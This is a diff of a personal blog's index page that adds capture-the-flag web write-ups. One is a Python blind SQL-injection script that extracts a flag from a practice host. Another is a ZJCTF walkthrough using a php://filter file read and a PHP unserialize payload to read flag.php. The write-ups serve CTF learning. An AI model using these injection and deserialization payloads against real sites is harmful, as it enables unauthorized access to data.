@@ -64,6 +64,42 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ctfer-from-0-to-1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/16/ctfer-from-0-to-1/" class="article-date">
+  <time datetime="2020-11-16T15:00:40.000Z" itemprop="datePublished">2020-11-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/16/ctfer-from-0-to-1/">ctfer_from_0_to_1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://zmh2000829.github.io/2020/11/16/ctfer-from-0-to-1/" data-id="ckhkofkaj0000d0vba2tc64ed" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-ctf-web9" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/10/18/ctf-web9/" class="article-date">
@@ -225,7 +261,16 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://c3662bc6-5676-4a07-898e-8c9e54927886.node3.buuoj.cn/index.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(x,mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    time.sleep(<span class="number">1</span>) <span class="comment">#过快来不及回应</span></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
 
 <p>得到flag—flag{942a10bb-4d59-4d27-8246-746862abd4b2}</p>
+<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>text=<a href="https://www.link-studio.cn/2.txt放&quot;welcome" target="_blank" rel="noopener">https://www.link-studio.cn/2.txt放&quot;welcome</a> to the zjctf”</p>
+<p>file = php://filter/read=convert.base64-encode/resource=useless.php得到内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="toString-是魔术方法的一种-当一个对象被当作字符串对待的时候，会触发这个魔术方法"><a href="#toString-是魔术方法的一种-当一个对象被当作字符串对待的时候，会触发这个魔术方法" class="headerlink" title="__toString() 是魔术方法的一种,当一个对象被当作字符串对待的时候，会触发这个魔术方法"></a>__toString() 是魔术方法的一种,当一个对象被当作字符串对待的时候，会触发这个魔术方法</h5><p>构造payload—</p>
+<p>/?text=<a href="https://www.link-studio.cn/2.txt&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}" target="_blank" rel="noopener">https://www.link-studio.cn/2.txt&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
+<p>得到flag</p>
+<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/14.png" class></div>
       
     </div>
     <footer class="article-footer">
@@ -933,56 +978,12 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/20/hello-world/" class="article-date">
-  <time datetime="2020-07-20T13:11:34.181Z" itemprop="datePublished">2020-07-20</time>
-</a>
+
+
+  <nav id="page-nav">
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/20/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://zmh2000829.github.io/2020/07/20/hello-world/" data-id="ckefowzhp0007kovbbxhp09ag" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -1014,7 +1015,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
     </div>
   </div>
 
@@ -1025,6 +1026,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/11/16/ctfer-from-0-to-1/">ctfer_from_0_to_1</a>
+          </li>
         
           <li>
             <a href="/2020/10/18/ctf-web9/">web比赛题目，最新更新11/9/2020</a>
@@ -1040,10 +1045,6 @@
         
           <li>
             <a href="/2020/09/23/ctf-web6/">ctf-web newbugku专题持续更新</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/26/ctf-web5/">ctf-web5</a>
           </li>
         
       </ul>
